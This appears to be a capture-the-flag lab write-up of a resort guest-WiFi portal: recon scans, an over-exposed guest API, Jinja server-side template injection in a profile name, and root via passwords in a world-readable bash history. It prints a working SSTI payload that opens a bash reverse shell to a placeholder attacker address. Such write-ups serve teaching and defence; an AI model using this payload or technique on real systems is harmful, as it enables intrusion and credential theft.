Casino

Hack Smarter · Web / Linux. A resort guest-WiFi portal leaks its guest database, then a template-injection flaw in a profile field gives a shell — and a careless bash history hands over root.

A Hack Smarter lab, shared with permission. Credentials, hashes, and flag values are redacted — the point is the attack chain, not the answers.

1. Recon

The only lead is the captive-portal IP. A scan shows SSH, a second SSH on 2222, and a Flask app on 80 (“Guest WiFi & Portal”) that redirects everything to /login.

nmap -p- --min-rate 1000 -oA scans/all-ports TARGET
feroxbuster -u http://TARGET/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

Content discovery finds /login, /dashboard, /profile and /logout — everything behind the login.

2. A Leaky API

Once logged in, the dashboard calls a room-status API that returns the resort's entire guest list — names, room numbers, tiers and checkout dates — far more than a guest portal should expose. That is a reportable data-exposure finding on its own, and it confirms the app happily returns structured data to a low-privilege user.

curl http://TARGET/api/v1/rooms/status   # 100 guest records

3. SSTI in the Profile Name

The profile page lets you update your display name, and the value is rendered back through the server's template engine without escaping — server-side template injection. A simple probe ({{7*7}} rendering as 49) confirms it, then a Jinja gadget turns it into code execution and a reverse shell.

# start a listener, then set the display name to:
{{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >&/dev/tcp/YOUR_IP/1337 0>&1"').read() }}

The shell lands as www-data inside the application container. The user flag is in the first local user's home directory.

4. Root from Bash History

Enumerating the home directories, one user's .bash_history is world-readable — and it is a goldmine. It records the user switching to a second account with the password typed inline, a MySQL login with that password, and the resort's root password.

cat /home/USER/.bash_history
# ... su DAVID
# DAVID'S_PASSWORD        <- captured here
# ... the service/root password appears too

Those credentials escalate to the second user and then to root; the root flag follows. Shell history is one of the first places to look after any Linux foothold.

What To Take Away

  • Don't return more data than a role needs. The guest API leaked the whole guest database.
  • User input rendered through a template engine is SSTI — test every reflected field with {{7*7}}.
  • Read .bash_history on every account. Typing passwords inline (su, mysql -p) writes them to disk.
  • Reused service/root passwords turn one careless log into total compromise.
